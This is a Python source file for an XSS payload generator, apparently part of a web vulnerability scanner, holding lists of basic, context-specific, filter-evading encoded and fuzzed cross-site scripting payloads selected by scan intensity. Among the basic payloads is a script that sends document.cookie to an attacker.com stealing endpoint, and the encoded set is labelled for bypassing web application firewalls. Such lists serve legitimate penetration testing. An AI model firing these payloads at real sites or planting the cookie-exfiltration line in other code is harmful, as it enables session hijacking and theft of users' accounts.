#!/usr/bin/env python3
"""
Payload generator for XSS testing
"""

import random
from typing import List, Dict, Any

class XSSPayloadGenerator:
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # Basic XSS payloads
        self.basic_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<details open ontoggle=alert('XSS')>",
            "<video src=x onerror=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<script>alert(document.cookie)</script>",
            "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>"
        ]
        
        # Context-aware payloads
        self.context_payloads = {
            'attribute': [
                '" onmouseover="alert(\'XSS\')"',
                '" onfocus="alert(\'XSS\')" autofocus',
                '" onclick="alert(\'XSS\')"',
                '" onerror="alert(\'XSS\')"',
                'javascript:alert(\'XSS\')',
                '" onblur="alert(\'XSS\')"',
                '" onchange="alert(\'XSS\')"'
            ],
            'javascript': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "';</script><script>alert('XSS')</script>",
                "\\';alert('XSS');//",
                "';alert(String.fromCharCode(88,83,83))//",
                "';confirm('XSS')//",
                "';prompt('XSS')//"
            ],
            'url': [
                "javascript:alert('XSS')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
                "javascript:alert(document.domain)",
                "data:text/html,<script>alert('XSS')</script>"
            ],
            'style': [
                "<style onload=alert('XSS')></style>",
                "expression(alert('XSS'))",
                "background:url(javascript:alert('XSS'));",
                "<div style=\"background:url(javascript:alert('XSS'))\">",
                "background:expression(alert('XSS'))"
            ],
            'comment': [
                "--><script>alert('XSS')</script>",
                "--!><script>alert('XSS')</script>",
                "<!--><script>alert('XSS')</script>"
            ]
        }
        
        # Encoded payloads for WAF bypass
        self.encoded_payloads = [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror=\u0061lert('XSS')>",
            "<a href=\"javascript:alert('XSS')\">",
            "<img src=x onerror=&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "<svg/onload=&#97&#108&#101&#114&#116&#40&#41>",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"
        ]
        
        # Fuzzing patterns
        self.fuzzing_patterns = [
            "<{tag}>alert('XSS')</{tag}>",
            "<{tag} onload=alert('XSS')>",
            "<{tag} src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')/*{fuzz}*/",
            "\" on{event}=alert('XSS')"
        ]
        
        self.tags = ['script', 'img', 'svg', 'body', 'div', 'a', 'p', 'span']
        self.events = ['load', 'error', 'click', 'mouseover', 'focus', 'blur', 'change']
        
        # Intensity settings
        self.intensity_settings = {
            'low': {
                'max_payloads': 10,
                'use_encoded': False,
                'use_context': False,
                'use_fuzzing': False
            },
            'medium': {
                'max_payloads': 25,
                'use_encoded': True,
                'use_context': True,
                'use_fuzzing': False
            },
            'high': {
                'max_payloads': 50,
                'use_encoded': True,
                'use_context': True,
                'use_fuzzing': True
            }
        }
    
    def generate_payloads(self, intensity: str = 'medium', context: str = None) -> List[str]:
        """
        Generate XSS payloads based on intensity and context
        
        Args:
            intensity: low, medium, or high
            context: Optional context type (attribute, javascript, url, style, comment)
            
        Returns:
            List of payload strings
        """
        settings = self.intensity_settings.get(intensity, self.intensity_settings['medium'])
        payloads = []
        
        # Add basic payloads
        payloads.extend(self.basic_payloads[:settings['max_payloads']])
        
        # Add context-specific payloads if available and enabled
        if settings['use_context'] and context and context in self.context_payloads:
            payloads.extend(self.context_payloads[context])
        
        # Add encoded payloads if enabled
        if settings['use_encoded']:
            payloads.extend(self.encoded_payloads[:settings['max_payloads'] // 3])
        
        # Add fuzzing payloads if enabled
        if settings['use_fuzzing']:
            payloads.extend(self._generate_fuzzing_payloads(settings['max_payloads'] // 4))
        
        # Remove duplicates and limit
        payloads = list(set(payloads))[:settings['max_payloads']]
        random.shuffle(payloads)
        
        return payloads
    
    def _generate_fuzzing_payloads(self, count: int) -> List[str]:
        """Generate fuzzing payloads for high intensity scans"""
        fuzzed = []
        
        for _ in range(min(count, 10)):
            pattern = random.choice(self.fuzzing_patterns)
            tag = random.choice(self.tags)
            event = random.choice(self.events)
            
            payload = pattern.replace('{tag}', tag).replace('{event}', event)
            fuzzed.append(payload)
            
            # Add some with random strings
            fuzzed.append(payload.replace('{fuzz}', 'x' * random.randint(1, 5)))
        
        return fuzzed
    
    def get_payloads_by_type(self, payload_type: str) -> List[str]:
        """Get payloads by specific type"""
        if payload_type == 'basic':
            return self.basic_payloads
        elif payload_type == 'encoded':
            return self.encoded_payloads
        elif payload_type in self.context_payloads:
            return self.context_payloads[payload_type]
        else:
            return []